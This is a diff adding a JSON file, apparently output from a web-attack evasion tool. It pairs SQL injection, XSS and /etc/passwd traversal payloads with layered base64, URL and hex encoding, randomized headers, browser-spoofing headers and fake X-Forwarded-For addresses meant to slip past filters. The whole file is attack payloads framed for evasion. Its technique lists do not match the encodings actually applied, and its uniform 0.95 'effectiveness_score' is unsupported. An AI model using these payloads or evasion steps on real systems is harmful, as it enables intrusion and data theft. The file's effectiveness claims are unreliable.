@@ -1,0 +1,212 @@
+[
+  {
+    "scenario": "SQL Injection Evasion",
+    "original_payload": "' UNION SELECT user(),database(),version()--",
+    "stealth_payload": {
+      "original": "' UNION SELECT user(),database(),version()--",
+      "layers": [
+        [
+          "base64",
+          "JyBVTklPTiBTRUxFQ1QgdXNlcigpLGRhdGFiYXNlKCksdmVyc2lvbigpLS0="
+        ],
+        [
+          "double_urlencode",
+          "JyBVTklPTiBTRUxFQ1QgdXNlcigpLGRhdGFiYXNlKCksdmVyc2lvbigpLS0%253D"
+        ],
+        [
+          "hex",
+          "4a794256546b6c5054694254525578465131516764584e6c636967704c4752686447466959584e6c4b436b73646d567963326c76626967704c53302532353344"
+        ]
+      ],
+      "final_payload": "4a794256546b6c5054694254525578465131516764584e6c636967704c4752686447466959584e6c4b436b73646d567963326c76626967704c53302532353344",
+      "obfuscation_ratio": 2.909090909090909
+    },
+    "stealth_request": {
+      "original": "GET http://target.com/vulnerable.php?data=' UNION SELECT user(),database(),version()--",
+      "encrypted_param": "JyBVTklPTiBTRUxFQ1QgdXNlcigpLGRhdGFiYXNlKCksdmVyc2lvbigpLS0=",
+      "obfuscated_request": {
+        "method": "GET",
+        "url": "http://target.com/vulnerable.php?data=JyBVTklPTiBTRUxFQ1QgdXNlcigpLGRhdGFiYXNlKCksdmVyc2lvbigpLS0%3D",
+        "headers": {
+          "ccgwgmid": "WnL9FKFuGf"
+        },
+        "data": null,
+        "techniques": [
+          "header_randomization",
+          "parameter_obfuscation",
+          "method_case_variation"
+        ]
+      },
+      "stealth_headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Connection": "keep-alive",
+        "Accept-Language": "en-US,en;q=0.5",
+        "DNT": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "cross-site",
+        "Cache-Control": "max-age=0",
+        "TE": "Trailers",
+        "X-Forwarded-For": "48.148.236.88"
+      },
+      "fragments": [
+        "http://target.com/vulnerable.php"
+      ],
+      "evasion_layers": [
+        "payload_encryption",
+        "request_obfuscation",
+        "header_randomization",
+        "request_fragmentation"
+      ]
+    },
+    "evasion_techniques": [
+      "encryption",
+      "obfuscation",
+      "fragmentation"
+    ],
+    "effectiveness_score": 0.95
+  },
+  {
+    "scenario": "XSS Evasion",
+    "original_payload": "<script>alert('XSS')</script>",
+    "stealth_payload": {
+      "original": "<script>alert('XSS')</script>",
+      "layers": [
+        [
+          "base64",
+          "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
+        ],
+        [
+          "double_urlencode",
+          "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%253D"
+        ],
+        [
+          "hex",
+          "50484e6a636d6c7764443568624756796443676e57464e544a796b384c334e6a636d6c776444342532353344"
+        ]
+      ],
+      "final_payload": "50484e6a636d6c7764443568624756796443676e57464e544a796b384c334e6a636d6c776444342532353344",
+      "obfuscation_ratio": 3.0344827586206895
+    },
+    "stealth_request": {
+      "original": "GET http://target.com/search.php?data=<script>alert('XSS')</script>",
+      "encrypted_param": "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
+      "obfuscated_request": {
+        "method": "get",
+        "url": "http://target.com/search.php?data=PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%253D",
+        "headers": {
+          "lbpaygau": "ggBUA9Gyfm"
+        },
+        "data": null,
+        "techniques": [
+          "header_randomization",
+          "parameter_obfuscation",
+          "method_case_variation"
+        ]
+      },
+      "stealth_headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Connection": "keep-alive",
+        "Accept-Language": "en-US,en;q=0.5",
+        "DNT": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "cross-site",
+        "Cache-Control": "max-age=0",
+        "TE": "Trailers",
+        "X-Forwarded-For": "67.21.186.147"
+      },
+      "fragments": [
+        "http://target.com/search.php"
+      ],
+      "evasion_layers": [
+        "payload_encryption",
+        "request_obfuscation",
+        "header_randomization",
+        "request_fragmentation"
+      ]
+    },
+    "evasion_techniques": [
+      "unicode_encoding",
+      "request_obfuscation",
+      "timing_delays"
+    ],
+    "effectiveness_score": 0.95
+  },
+  {
+    "scenario": "Directory Traversal Evasion",
+    "original_payload": "../../../etc/passwd",
+    "stealth_payload": {
+      "original": "../../../etc/passwd",
+      "layers": [
+        [
+          "base64",
+          "Li4vLi4vLi4vZXRjL3Bhc3N3ZA=="
+        ],
+        [
+          "double_urlencode",
+          "Li4vLi4vLi4vZXRjL3Bhc3N3ZA%253D%253D"
+        ],
+        [
+          "hex",
+          "4c6934764c6934764c6934765a58526a4c33426863334e335a4125323533442532353344"
+        ]
+      ],
+      "final_payload": "4c6934764c6934764c6934765a58526a4c33426863334e335a4125323533442532353344",
+      "obfuscation_ratio": 3.789473684210526
+    },
+    "stealth_request": {
+      "original": "GET http://target.com/download.php?data=../../../etc/passwd",
+      "encrypted_param": "Li4vLi4vLi4vZXRjL3Bhc3N3ZA==",
+      "obfuscated_request": {
+        "method": "GET",
+        "url": "http://target.com/download.php?data=Li4vLi4vLi4vZXRjL3Bhc3N3ZA%3D%3D",
+        "headers": {
+          "cicmquls": "SJgidJNwXh"
+        },
+        "data": null,
+        "techniques": [
+          "header_randomization",
+          "parameter_obfuscation",
+          "method_case_variation"
+        ]
+      },
+      "stealth_headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Connection": "keep-alive",
+        "Accept-Language": "en-US,en;q=0.5",
+        "DNT": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "cross-site",
+        "Cache-Control": "max-age=0",
+        "TE": "Trailers",
+        "X-Forwarded-For": "70.70.172.6"
+      },
+      "fragments": [
+        "http://target.com/download.php"
+      ],
+      "evasion_layers": [
+        "payload_encryption",
+        "request_obfuscation",
+        "header_randomization",
+        "request_fragmentation"
+      ]
+    },
+    "evasion_techniques": [
+      "hex_encoding",
+      "fragmentation",
+      "header_spoofing"
+    ],
+    "effectiveness_score": 0.95
+  }
+]
